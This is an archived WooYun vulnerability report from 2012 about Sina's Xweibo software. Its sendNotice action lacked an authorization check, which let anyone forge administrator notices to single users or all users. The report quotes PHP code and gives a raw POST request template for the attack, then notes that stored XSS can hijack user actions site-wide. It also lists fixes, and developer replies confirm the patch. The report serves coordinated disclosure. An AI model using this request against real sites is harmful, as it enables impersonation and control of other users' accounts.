{"id": 20562, "wybug_id": "wooyun-2012-05235", "wybug_title": "新浪Xweibo程序伪造管理员给任意/全体用户发Notice", "wybug_corp": "新浪", "wybug_author": "牛奶坦克", "wybug_date": "2012-03-13 15:51", "wybug_open_date": "2012-04-27 15:51", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-03-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-03-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-04-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-04-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-04-27：\t细节向公众公开  简要描述：   起因是发现了xweibo某个注入漏洞，但是后来发现这个功能是需要管理权限的，总是这样大意。。。不过还是找到点好玩的东西。 详细说明：  \n首先xweibo搞了个路由函数，对用户提交的变量做同一的分配控制\tfunction V($vRoute,$def_v=NULL,$setVar=false){\t\tstatic $v;\t\tif (empty($v)){$v = array();}\t\t$vRoute = trim($vRoute);\t\t//强制初始化值\t\tif ($setVar) {$v[$vRoute] = $def_v;return true;}\t\tif (!isset($v[$vRoute])){\t\t\t$vKey = array('C'=>$_COOKIE,'G'=>$_GET,\t\t'P'=>$_POST,'R'=>$_REQUEST,\t\t\t\t\t\t  'F'=>$_FILES,\t'S'=>$_SERVER,\t'E'=>$_ENV,\t\t\t\t\t\t  '-'=>$GLOBALS[V_CFG_GLOBAL_NAME]\t\t\t);\t\t\tif (empty($vKey['R'])) {\t\t\t\t$vKey['R'] = array_merge($_COOKIE, $_GET, $_POST);\t\t\t}\t\t\tif ( !preg_match(\"#^([cgprfse-])(?::(.+))?\\$#sim\",$vRoute,$m) || !isset($vKey[strtoupper($m[1])]) ){\t\t\t\ttrigger_error(\"Can't parse var from vRoute: $vRoute \", E_USER_ERROR);\t\t\t\treturn NULL;\t\t\t}省略用户操作功能都封装在了action模块中，action.mod.php，找到sendNotice这个action\t\tfunction sendNotice() {\t\t\t$nowTime = APP_LOCAL_TIMESTAMP;\t\t\t$sina_uid = V('p:uid', 0);\t\t\t$title = trim(V('p:title', ''));\t\t\t$content = trim(V('p:content', ''));\t\t\t$available_time = (int)V('p:available_time', $nowTime);\t\t\t省略\t\t\t\t\t\t$rst = DR('notice.sendNotice', '', $title, $content, $sina_uid, null, 0, $available_time);\t\t\tif (!empty($rst['errno'])) {\t\t\t\tAPP::ajaxRst(false, $rst['errno'], $rst['err']);\t\t\t\texit;\t\t\t} else {\t\t\t\tAPP::ajaxRst(true, 0);\t\t\t\texit;\t\t\t}\t\t}没啥限制额，在看看notice中的功能定义\t\t$send_all = $sina_uid === 0 ? true : false; //是否发送给全站用户\t\t\t\tif (is_null($sina_uid)) {\t\t\t$sina_uid = array();\t\t} else if (!is_array($sina_uid)) {\t\t\t$sina_uid = (array)$sina_uid;\t\t}... ...\t\t$data = array();\t\t$data['sender_id'] = $sender_id;\t\t$data['title'] = $title;\t\t$data['content'] = $content;\t\t$data['add_time'] = APP_LOCAL_TIMESTAMP;\t\t$data['available_time'] = empty($available_time) ? APP_LOCAL_TIMESTAMP : $available_time;\t\t\t\t$notice_id = $this->db->save($data, 0, T_NOTICE);\t\tif ($notice_id === false) {\t\t\treturn RST(false, 1210004, '发送失败，请重试');\t\t}直接构造利用这个actionPOST /?m=api/weibo/action.sendNotice&_=1331620238391 HTTP/1.1.. ..uid=[改为0为群发，其他用户uid为单独发送]&title=[标题]&content=[内容]&available_time=123123123\n另外，最后发现显示内容还没有做html格式化，所以还能以管理员名义给全站用户来个xss，这个xss的意义在于可以绕过官方限制做一些加关注，发微博等所有xweibo接口支持的用户操作功能（经过确认xweibo没啥限制），可以控制这个xweibo站点上所有用户/微博用户的行为。   漏洞证明：  \n\n\n\n   修复方案：  1，notice接口需要身份限制；2，xss问题需要转义；3，其他微博操作接口需要做csrf，referer等检测。   版权声明：转载请注明来源 牛奶坦克@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-03-13 18:04 厂商回复： 感谢提供，正在处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-03-13 15:57 |    \t\t坏人咖啡 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:4        | 做一个简简单单的坏人)\t\t \n  很好很强大表示关注    \n     2012-03-13 16:10 |    \t\t黑龙 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | http://bit.ly/zCr8h5)\t\t \n  好玩儿吗？等细节    \n     2012-03-13 17:32 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  坐等细节。    \n     2012-03-13 19:38 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  我是现在这个项目的程序员。今天病了，明日早上回公司看看具体安排。先多谢作者提交。    \n     2012-03-13 19:44 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  另外问问洞主，你说的SQL注入问题可否bypass今年2月补丁中内置的Mysqlids的拦截？    \n     2012-03-13 22:35 |    \t\t牛奶坦克 \t\t\t( 普通白帽子  |\t\t\t        Rank:355 漏洞数:21        | 晚安,牛奶)\t\t \n  @horseluke 那个地方看到需要管理员权限就没在跟了，可以抽时间在看一下。    \n     2012-03-14 11:21 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @牛奶坦克 内部讨论后，发现是典型的应用场景变更没注意细节所引发的血案 -_-|| 一些类似关联（虽然讲的copy代码和这个漏洞无关）：（1）http://weibo.com/1679264133/y9Gr05Xbr （2）http://weibo.com/1679264133/y9GrUx2wx （3）http://weibo.com/1679264133/y9GvwwVYq    \n     2012-04-18 19:16 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  To all，漏洞已修复。由于内部发布故障，在细节公开截至前发布。再次感谢@牛奶坦克 的提交。修复地址：http://bbs.x.weibo.com/viewthread.php?tid=127622    \n     2012-04-19 14:42 |    \t\t牛奶坦克 \t\t\t( 普通白帽子  |\t\t\t        Rank:355 漏洞数:21        | 晚安,牛奶)\t\t \n  @horseluke 给力！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}